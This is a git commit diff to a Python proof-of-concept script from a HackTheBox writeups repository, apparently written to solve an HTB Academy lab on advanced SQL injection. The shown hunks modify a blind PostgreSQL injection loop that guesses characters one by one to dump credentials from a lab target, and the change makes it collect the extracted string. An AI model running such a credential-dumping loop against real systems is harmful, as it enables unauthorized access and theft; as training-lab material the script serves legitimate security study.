4adf062fcb958212a81c1c6f7fd11b1429a4b924
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2025-01-24 11:48:30 -0500

    Update Advanced_SQL_Injections-Skills_Assessment.py

--- HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Skills_Assessment.py
+++ HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Skills_Assessment.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 """Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'Advanced SQL Injections'. 
-This script exploits a postgreSQL injection to dump credentials for log in."""
+This script exploits a postgres injection to dump credentials"""
 
 import requests
 import string
@@ -9,10 +9,11 @@ import string
 target= f"10.129.204.251:8080" # Change this
 proxies= {"http":"http://127.0.0.1:8081"} # Change this
 charlist= range(32,127)
-numlist= range(1,20)
+numlist= range(1,100) 
 
 def sqli():
     count=0
+    combine_chars=''
     for num in numlist:
         if count > 100:
             break
@@ -27,10 +28,12 @@ def sqli():
             if 'true' in response.text:
                 print(f"{num}:{chr(char)}")
                 count=0
+                combine_chars= f"{combine_chars}{chr(char)}"
                 break
             else:
                 count+=1
                 pass
+    print(combine_chars)
 
 try:
     sqli()
